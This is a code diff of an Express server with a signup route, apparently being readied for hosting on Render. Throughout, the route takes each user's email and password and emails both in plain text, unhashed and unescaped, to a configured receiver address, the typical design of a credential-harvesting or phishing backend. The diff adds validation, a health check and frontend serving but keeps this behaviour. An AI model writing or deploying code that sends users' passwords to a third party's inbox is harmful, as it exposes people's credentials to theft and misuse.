@@ -1,6 +1,5 @@
 import express from "express";
 import path from "path";
-import { createServer as createViteServer } from "vite";
 import dotenv from "dotenv";
 import * as SibApiV3Sdk from "@sendinblue/client";
 
@@ -12,19 +11,32 @@ async function startServer() {
 
   app.use(express.json());
 
+  // ✅ HEALTH CHECK ROUTE (fixes "Cannot GET /")
+  app.get("/", (req, res) => {
+    res.send("Server is running 🚀");
+  });
+
+  // ✅ SIGNUP ROUTE
   app.post("/api/signup", async (req, res) => {
     const { email, password } = req.body;
+
+    if (!email || !password) {
+      return res.status(400).json({
+        error: "Email and password are required",
+      });
+    }
 
     const brevoKey = process.env.BREVO_API_KEY;
     const receiverEmail = process.env.RECEIVER_EMAIL;
     const senderEmail = process.env.EMAIL_USER;
 
     if (!brevoKey || !receiverEmail || !senderEmail) {
-      return res.status(500).json({ error: "Missing env variables" });
+      console.error("Missing env variables");
+      return res.status(500).json({ error: "Server misconfigured" });
     }
 
     try {
-      console.log("Sending email...");
+      console.log("📨 Sending Brevo email...");
 
       const apiInstance = new SibApiV3Sdk.TransactionalEmailsApi();
 
@@ -33,7 +45,7 @@ async function startServer() {
         brevoKey
       );
 
-      const response = await apiInstance.sendTransacEmail({
+      const result = await apiInstance.sendTransacEmail({
         sender: {
           email: senderEmail,
           name: "Signup System",
@@ -45,23 +57,38 @@ async function startServer() {
         ],
         subject: "New Signup Received",
         htmlContent: `
-          <h3>New Signup</h3>
-          <p>Email: ${email}</p>
-          <p>Password: ${password}</p>
+          <h2>New Signup</h2>
+          <p><b>Email:</b> ${email}</p>
+          <p><b>Password:</b> ${password}</p>
         `,
       });
 
-      console.log("Brevo response:", response);
+      console.log("✅ Brevo success:", result);
 
-      return res.json({ success: true });
+      return res.status(200).json({
+        success: true,
+        message: "Email sent successfully",
+      });
     } catch (err) {
-      console.error("Brevo failed:", err);
-      return res.status(500).json({ error: "Email failed" });
+      console.error("❌ Brevo error:", err);
+      return res.status(500).json({
+        error: "Failed to send email",
+      });
     }
   });
 
+  // ✅ PRODUCTION FRONTEND FIX (IMPORTANT FOR RENDER)
+  const distPath = path.resolve("dist");
+
+  app.use(express.static(distPath));
+
+  app.get("*", (req, res) => {
+    res.sendFile(path.join(distPath, "index.html"));
+  });
+
+  // ✅ START SERVER (Render requirement)
   app.listen(PORT, "0.0.0.0", () => {
-    console.log("Server running on", PORT);
+    console.log(`Server running on port ${PORT}`);
   });
 }
 
